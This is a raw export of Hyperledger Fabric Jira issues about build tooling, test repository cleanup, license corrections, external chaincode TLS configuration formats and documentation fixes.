Use the same organization for Orderer and Peer in cryptogen ,FAB-17221,43637,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,toxzic,toxzic,09/Dec/19 2:07 PM,09/Dec/19 2:07 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-crypto,,,,,,,,,1,,,,,,"As Fabric is moving to Raft, it would be great if we can generate crypto materials for Orderer and Peer using the same organization identity. Currently there's no way to do this and even if you specify the same name and domain there are two different sets generated, which is not necessary.",,joaquimpedrooliveira,toxzic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015zf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joaquimpedrooliveira,toxzic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Vagrant dev_enviornmet still uses go version go1.13.3  but Make file requires go version go1.13.4,FAB-17222,43638,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,idiota101,idiota101,idiota101,09/Dec/19 3:33 PM,26/Apr/20 1:26 PM,28/Oct/23 3:09 AM,26/Apr/20 1:26 PM,,,,,,,,,,,,,,fabric-tools,,,,,,,,,0,build-system,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015zn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Apr/20 1:25 PM;denyeart;Vagrant has been updated to Go 1.14.1 to match Fabric master.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove all references to LTE tool and tests in fabric-test repo.,FAB-17223,43639,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,scottz,dereckluo,dereckluo,09/Dec/19 10:35 PM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,28/Jan/20 12:16 AM,,,,,,,,,,,,,,fabric-ledger,fabric-quality,,,,,,,,0,,,,,,- Remove all references to LTE tool and tests from Makefile and README and regression/daily/ and regression/smoke/.,,denyeart,dereckluo,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16895,,,,,,,,,,FAB-17224,,,,,,,,,FAB-17224,FAB-17423,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfo:o",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,dereckluo,scottz,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jan/20 1:25 PM;denyeart;https://github.com/hyperledger/fabric/pull/498 merged LTE to fabric repo.
Now LTE can be removed from fabric-test. ;;;","25/Jan/20 6:53 AM;scottz;[https://github.com/hyperledger/fabric-test/pull/71]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove fabric-test/tools/LTE/,FAB-17224,43640,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,scottz,dereckluo,dereckluo,09/Dec/19 10:43 PM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,24/Jan/20 1:40 AM,,,,,,,,,,,,,,fabric-ledger,fabric-quality,,,,,,,,0,,,,,,- Remove fabric-test/tools/LTE/,,denyeart,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16895,,,,,,,,,,,,FAB-17223,,,,FAB-17223,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfo:q",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jan/20 1:25 PM;denyeart;https://github.com/hyperledger/fabric/pull/498 merged LTE to fabric repo.
Now LTE can be removed from fabric-test. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Migrate LTE tools and test scripts to fabric repository (ledger test folder),FAB-17225,43641,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,dereckluo,dereckluo,09/Dec/19 10:48 PM,20/Jan/20 1:22 PM,28/Oct/23 3:09 AM,20/Jan/20 1:22 PM,,,,,,,,,,v2.0.0,,,,fabric-ledger,fabric-quality,,,,,,,,0,,,,,,"- Place LTE tools and test scripts in fabric repository in a ledger test folder. The plan is to keep the tool for developers to use on an as-needed basis, but not run all of the tests as part of any regular CI job. It would make sense to incorporate a small test using LTE (such as that executed in the fabric-test smoke test suite) into fabric integration tests folder in ledger domain, to help ensure the tool is maintained.",,denyeart,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16895,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0160b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jan/20 1:22 PM;denyeart;https://github.com/hyperledger/fabric/pull/498 merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-test pteReport.txt files are not saved for all networks when testname is repeated,FAB-17226,43645,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,scottz,scottz,10/Dec/19 1:50 AM,14/Jan/20 3:06 AM,28/Oct/23 3:09 AM,14/Jan/20 3:06 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"This bug is to address the fact that only one pteReport.txt file is saved per test job. In the k8s test jobs, we run 3 test suites, using 3 network-spec files. Some of the tests are run in each network. The pteReport.txt file does not contain the network name, so that means the pteReport.txt file saved is only for the last test suite that includes it. The others are overwritten. We should name the files uniquely, or put all the logfiles for each test suite in separate directory, everytime we run a testsuite i.e. with a different network-spec.

Screenshot is attached with list of files generated after a test suite was executed. Observe that there is not a pteReport.txt file for all the tests, as there should be.

(Note: A test suite that runs a test twice within a single test suite using a single network-spec will only save one pteReport.txt file (and other log files) for one of them. That is a different bug.)",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16064,,,,,,,,,"10/Dec/19 1:46 AM;scottz;Screen Shot 2019-12-09 at 11.37.16 AM.png;https://jira.hyperledger.org/secure/attachment/18019/Screen+Shot+2019-12-09+at+11.37.16+AM.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx79",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jan/20 3:06 AM;bharadwajambati1;This will be covered in FAB-17178;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Updating go.mod in fabric-test,FAB-17227,43646,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,10/Dec/19 2:10 AM,29/Jan/20 1:01 PM,28/Oct/23 3:09 AM,12/Dec/19 1:20 AM,v1.4.4,v2.0.0,,,,,,,,v1.4.4,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx7i",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Dec/19 12:15 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/26];;;","11/Dec/19 4:08 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/27] for release-1.4 branch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
A consistent model should be used for external chaincode clients and servers,FAB-17228,43648,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wlahti,sykesm,sykesm,10/Dec/19 3:34 AM,18/Dec/19 1:04 AM,28/Oct/23 3:09 AM,18/Dec/19 1:04 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The {{chaincode.json}} provided to external builder `run` implementations uses fields containing PEM encoded certificates and key material that needs to find its way to the launched chaincode instance.

For example, our binary run implementation includes the following:
{code:java}
export CORE_CHAINCODE_ID_NAME=""$(jq -r .chaincode_id ""$ARTIFACTS/chaincode.json"")""
export CORE_PEER_TLS_ENABLED=""true""
export CORE_TLS_CLIENT_CERT_FILE=""$ARTIFACTS/client.crt""
export CORE_TLS_CLIENT_KEY_FILE=""$ARTIFACTS/client.key""
export CORE_PEER_TLS_ROOTCERT_FILE=""$ARTIFACTS/root.crt""

jq -r .client_cert ""$ARTIFACTS/chaincode.json"" > ""$CORE_TLS_CLIENT_CERT_FILE""
jq -r .client_key  ""$ARTIFACTS/chaincode.json"" > ""$CORE_TLS_CLIENT_KEY_FILE""
jq -r .root_cert   ""$ARTIFACTS/chaincode.json"" > ""$CORE_PEER_TLS_ROOTCERT_FILE""
{code}
The {{chaincode/server/connection.json}} file provided by an external {{release}} implementation the peer, however, includes fields with *paths* to files containing the PEM encoded keys and certificates. An example of this can be found in {{container/externalbuilder/instance_test.go}}:
{code:java}
			//initiaze with a well-formed, all fields set, connection.json file
			ccdata := `{""address"": ""ccaddress:12345"", ""tls_required"": true, ""dial_timeout"": ""10s"", ""client_auth_required"": true, ""key_path"": ""key.pem"", ""cert_path"": ""cert.pem"", ""root_cert_path"": ""root.pem""}`
			err = ioutil.WriteFile(filepath.Join(instance.ChaincodeServerReleaseDir(), ""connection.json""), []byte(ccdata), 0600)
			Expect(err).NotTo(HaveOccurred())
			err = ioutil.WriteFile(filepath.Join(instance.ChaincodeServerReleaseDir(), ""key.pem""), []byte(""fake-key""), 0600)
			Expect(err).NotTo(HaveOccurred())
			err = ioutil.WriteFile(filepath.Join(instance.ChaincodeServerReleaseDir(), ""cert.pem""), []byte(""fake-cert""), 0600)
			Expect(err).NotTo(HaveOccurred())
			err = ioutil.WriteFile(filepath.Join(instance.ChaincodeServerReleaseDir(), ""root.pem""), []byte(""fake-root-cert""), 0600)
			Expect(err).NotTo(HaveOccurred())
{code}
Instead of having two flavors, we want to have one with a preference for a self-contained, portable asset over a collection of assets.

That said, we need to change the {{chaincode/server/connection.json}} to contain the PEM encoded data instead of paths.
{code:java}
// ChaincodeServerUserData holds ""connection.json"" information
type ChaincodeServerUserData struct {
        Address            string   `json:""address""`
        DialTimeout        Duration `json:""dial_timeout""`
        TLSRequired        bool     `json:""tls_required""`
        ClientAuthRequired bool     `json:""client_auth_required""`
        KeyPath            string   `json:""key_path""`
        CertPath           string   `json:""cert_path""`
        RootCertPath       string   `json:""root_cert_path""`
}
{code}
should be rendered as
{code:java}
// ChaincodeServerUserData holds ""connection.json"" information
type ChaincodeServerUserData struct {
        Address            string   `json:""address""`
        DialTimeout        Duration `json:""dial_timeout""`
        TlsRequired        bool     `json:""tls_required""`
        ClientAuthRequired bool     `json:""client_auth_required""`
        ClientKey          string   `json:""client_key""`
        ClientCert         string   `json:""client_cert""`
        RootCert           string   `json:""root_cert""`
}
{code}
This keeps the keys consistent between client and server and maintains a single artifact for connection data.",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zl9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Dec/19 4:41 AM;wlahti;[https://github.com/hyperledger/fabric/pull/407];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incorrect license in file.,FAB-17229,43653,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ryjones,ryjones,10/Dec/19 4:07 AM,02/Jan/20 7:50 PM,28/Oct/23 3:09 AM,02/Jan/20 7:50 PM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,,,,,,"package.json says:

  ""license"": ""ISC""

 

The correct license is Apache 2.
 * fabric-test/tools/PTE/CITest/scripts/package.json
 * fabric-test/tools/NL/package.json",,mastersingh24,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01623:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),mastersingh24,ryjones,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Dec/19 8:52 PM;mastersingh24;[https://github.com/hyperledger/fabric-test/pull/37];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update the descriptive text associated with externalBuilders in sampleconfig/core.yaml,FAB-17231,43656,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,10/Dec/19 5:11 AM,24/Dec/19 3:32 AM,28/Oct/23 3:09 AM,24/Dec/19 3:32 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The current sample configuration is incomplete and misleading:
{code}
    # List of directories to treat as external builders and launchers for
    # chaincode. The external builder detection processing will iterate over the
    # builders in the order specified below.
    externalBuilders: []
{code}

The description should be extended to clearly indicate that this is a list of elements of the following format:
{code}
  externalBuilders:
    - path: /some/path
      name: some-descriptive-name-for-debug
      environmentWhitelist:
         - ENVVAR_NAME_TO_PROPAGATE_FROM_PEER
         - ANOTHER_ENVVAR_NAME
{code}",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add testing with Fabric binaries to Contributing Guide,FAB-17232,43657,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,negupta,pandrejko,pandrejko,10/Dec/19 6:06 AM,03/Jun/23 3:52 AM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,https://wiki.hyperledger.org/display/fabric/Testing+with+Fabric+binaries,,DarkGV,knucksDev,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwz",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),DarkGV,knucksDev,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Dec/20 10:01 AM;DarkGV;I misclicked and changed the rank of this issue, thus I lowered the rank the get it back to its original position.

Sorry for that!;;;","03/Jun/23 3:52 AM;knucksDev;The Fabric-CLI install section in the README says to look for the binaries in the bin folder but there is no bin folder: [https://github.com/hyperledger/fabric-cli]

 

Is there anyway I can report this issue? I can't find binaries in this repo;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode package comment in in persistence/chaincode_package.go needs to be updated,FAB-17233,43660,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,sykesm,sykesm,10/Dec/19 8:12 AM,18/Dec/19 1:05 AM,28/Oct/23 3:09 AM,18/Dec/19 1:05 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The following comment is at the top of {{chaincode_package.go}}:

{code}
// The chaincode package is simply a .tar.gz file.  For the time being, we
// assume that the package contains a Chaincode-Package-Metadata.json file
// which contains a 'Type', and optionally a 'Path'.  In the future, it would
// be nice if we moved to a more buildpack type system, rather than the below
// presented JAR+manifest type system, but for expediency and incremental changes,
// moving to a tar format over the proto format for a user-inspectable artifact
// seems like a good step.
{code}

This comment is stale with respect to the name of the json file and the case of the keys in the json document.",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlf",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Dec/19 5:48 AM;wlahti;[https://github.com/hyperledger/fabric/pull/410];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix Doc Broken Links,FAB-17234,43665,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,pandrejko,pandrejko,10/Dec/19 10:14 PM,04/Jan/20 5:50 AM,28/Oct/23 3:09 AM,04/Jan/20 5:50 AM,v1.4.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Some of the hyperlink in this documentation are broken
https://hyperledger-fabric.readthedocs.io/en/release-1.4/chaincode4ade.html#chaincode-access-control  

Such as:
https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/ext/cid/README.md 

https://github.com/hyperledger/fabric/tree/master/core/chaincode/shim/ext/entities  

